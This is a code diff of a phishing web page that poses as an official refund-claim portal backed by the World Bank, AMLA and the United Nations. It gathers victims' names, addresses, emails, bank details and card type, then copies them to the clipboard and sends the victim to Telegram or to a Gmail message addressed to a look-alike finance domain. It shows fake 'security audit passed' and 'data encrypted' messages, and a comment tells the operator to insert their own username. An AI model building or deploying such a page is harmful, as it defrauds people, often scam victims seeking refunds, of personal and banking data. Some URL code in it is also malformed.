@@ -96,46 +96,69 @@
                 <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
                     <h2>SECTION 3: REVIEW INFORMATION</h2>
-                    <div id="reviewDisplay" style="max-height: 400px; overflow-y: auto; padding-right: 10px;"></div>
-                    <div class="contact-link" onclick="window.open('https://google.com')">📧 DIRECT CONTACT THE AUTHORITY</div>
+                    <div id="reviewDisplay"></div>
+                    
+                    <label style="margin-top:20px; color:var(--hamburg-blue)">Choose Submission Channel (Auto-Copies Info):</label>
+                    <div class="contact-options">
+                        <div class="contact-btn btn-telegram" onclick="submitTo('telegram')">💬 SUBMIT VIA TELEGRAM</div>
+                        <div class="contact-btn btn-gmail" onclick="submitTo('gmail')">📧 SUBMIT VIA GMAIL</div>
+                    </div>
+
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT INFO</button>
-                        <button type="button" onclick="finalSubmit()">SUBMIT TO DATABASE</button>
+                        <button type="button" onclick="finalReceipt()">SUBMIT TO DATABASE</button>
                     </div>
                 </div>
             </form>
-            <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025</div>
+            <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
         </div>
-        <div class="side-text">
-            <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence and total protection from deceptive practices.</p>
-        </div>
+
+        <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark for commercial integrity and consumer safety...</p></div>
     </div>
+
     <script>
         function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
+        
         function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true; inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
             if(ok) { if(next === 3) populate(); show(next); }
         }
+
         function populate() {
-            const data = [
-                {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('mn').value + " " + document.getElementById('ln').value},
-                {l: "RESIDENTIAL ADDRESS", v: document.getElementById('addr').value},
-                {l: "EMAIL / PHONE", v: document.getElementById('em').value + " / " + document.getElementById('ph').value},
-                {l: "NATIONALITY", v: document.getElementById('nat').value},
-                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
-                {l: "BANK / ACCOUNT", v: document.getElementById('bnk').value + " - " + document.getElementById('an').value},
+            const items = [
+                {l: "NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
+                {l: "ADDRESS", v: document.getElementById('addr').value},
+                {l: "EMAIL", v: document.getElementById('em').value},
+                {l: "AMOUNT", v: document.getElementById('amt').value},
+                {l: "BANK", v: document.getElementById('bn').value},
                 {l: "CARD TYPE", v: document.getElementById('ct').value}
             ];
-            let html = ""; data.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
+            let html = ""; items.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
             document.getElementById('reviewDisplay').innerHTML = html;
         }
-        function finalSubmit() {
+
+        function submitTo(platform) {
             const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            alert("SECURITY AUDIT PASSED. \nReference: " + ref);
-            window.open('https://forms.gle', '_blank');
-            document.getElementById('section3').innerHTML = `<div style="text-align:center; padding:40px; border: 2px dashed var(--hamburg-blue);"><h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESS</h2><p>Reference: <strong>${ref}</strong></p><div style="font-size:80px; margin:20px;">✅</div><button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; font-weight:bold;">DONE</button></div>`;
+            const summary = `--- CLAIM SUMMARY --- \nReference: ${ref}\nName: ${document.getElementById('fn').value} ${document.getElementById('ln').value}\nAddress: ${document.getElementById('addr').value}\nEmail: ${document.getElementById('em').value}\nAmount: ${document.getElementById('amt').value}\nBank: ${document.getElementById('bn').value}\nCard Type: ${document.getElementById('ct').value}`;
+            
+            // Smart Copy Logic
+            navigator.clipboard.writeText(summary).then(() => {
+                alert("INFO COPIED TO CLIPBOARD! \nOpening " + platform.toUpperCase() + "... Just PASTE the message and click send.");
+                
+                if(platform === 'telegram') {
+                    window.open('https://t.me', '_blank'); // Palitan mo ng username mo
+                } else {
+                    const mailTo = "globalreimbursementmanagement@financeeu.site";
+                    window.open(`https://google.com{mailTo}&su=CLAIM+${ref}`, '_blank');
+                }
+            });
+        }
+
+        function finalReceipt() {
+            const ref = "REF-" + Math.floor(Math.random() * 1000000);
+            alert("SECURITY AUDIT PASSED. DATA ENCRYPTED.");
+            document.getElementById('section3').innerHTML = `<div style="text-align:center; padding:40px;"><h2>CLAIM RECORDED</h2><p>Ref: ${ref}</p><div style="font-size:60px;">✅</div></div>`;
         }
     </script>
 </body>
